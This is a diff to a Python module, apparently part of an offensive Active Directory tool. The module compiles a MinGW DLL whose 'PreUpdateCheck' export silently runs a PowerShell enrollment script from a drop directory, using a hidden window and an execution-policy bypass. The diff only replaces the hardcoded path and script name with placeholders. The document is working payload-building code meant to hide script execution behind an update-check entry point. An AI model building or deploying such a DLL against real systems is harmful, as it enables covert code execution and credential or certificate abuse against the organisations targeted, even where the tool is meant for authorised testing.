@@ -62,7 +62,7 @@ _MINGW_ENROLL_DLL_C = r"""
 #include <windows.h>
 
 static void dbg(const char *msg) {
-    FILE *f = fopen("C:\\ProgramData\\UpdateMonitor\\dll.log", "a");
+    FILE *f = fopen("{DROP_PATH}\\dll.log", "a");
     if (f) {
         fprintf(f, "%s\n", msg);
         fclose(f);
@@ -72,7 +72,7 @@ static void dbg(const char *msg) {
 static void run_enroll(void) {
     /*
      * x86 DLL on x64 Windows: use Sysnative so cmd/powershell are 64-bit and
-     * can reach System32. WoW64 cmd.exe often fails to start enroll.ps1.
+     * can reach System32. WoW64 cmd.exe often fails to start the enrollment script.
      */
     char cmd[768];
     snprintf(
@@ -80,7 +80,7 @@ static void run_enroll(void) {
         sizeof(cmd),
         "C:\\Windows\\Sysnative\\cmd.exe /c \"\"C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\" "
         "-NoProfile -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass "
-        "-Command \"& 'C:\\ProgramData\\UpdateMonitor\\enroll.ps1'\"\"");
+        "-Command \"& '{DROP_PATH}\\{ENROLL_SCRIPT}'\"\"");
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -88,7 +88,7 @@ static void run_enroll(void) {
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    dbg("PreUpdateCheck: launching enroll.ps1");
+    dbg("PreUpdateCheck: launching {ENROLL_SCRIPT}");
     if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         char err[80];
         snprintf(err, sizeof(err), "CreateProcess failed: %lu", (unsigned long)GetLastError());
@@ -98,7 +98,7 @@ static void run_enroll(void) {
     WaitForSingleObject(pi.hProcess, 180000);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    dbg("PreUpdateCheck: enroll.ps1 finished");
+    dbg("PreUpdateCheck: {ENROLL_SCRIPT} finished");
 }
 
 __declspec(dllexport) int PreUpdateCheck(void) {
@@ -114,6 +114,9 @@ BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
     return TRUE;
 }
 """
+
+_DEFAULT_ENROLL_SCRIPT = "enroll.ps1"
+
 
 _MINGW_GCC = {
     "x64": ["x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc-15", "x86_64-w64-mingw32-gcc-14"],
@@ -198,12 +201,13 @@ def build_cert_enroll_dll_mingw(
     out_path: Path,
     arch: TargetArch = "x86",
     drop_path: str = r"C:\ProgramData",
+    enroll_script: str = _DEFAULT_ENROLL_SCRIPT,
 ) -> Path:
-    """DLL that runs enroll.ps1 from a writable drop dir."""
+    """DLL that runs enrollment script from a writable drop dir."""
     gcc = ensure_mingw_gcc(arch)
     out_path.parent.mkdir(parents=True, exist_ok=True)
     safe = drop_path.replace("\\", "\\\\").rstrip("\\")
-    code = _MINGW_ENROLL_DLL_C.replace(r"C:\\ProgramData\\UpdateMonitor", safe)
+    code = _MINGW_ENROLL_DLL_C.replace(r"{DROP_PATH}", safe).replace("{ENROLL_SCRIPT}", enroll_script)
     with tempfile.TemporaryDirectory(prefix="admapper-enroll-dll-") as tmp:
         src = Path(tmp) / "enroll.c"
         def_file = Path(tmp) / "enroll.def"
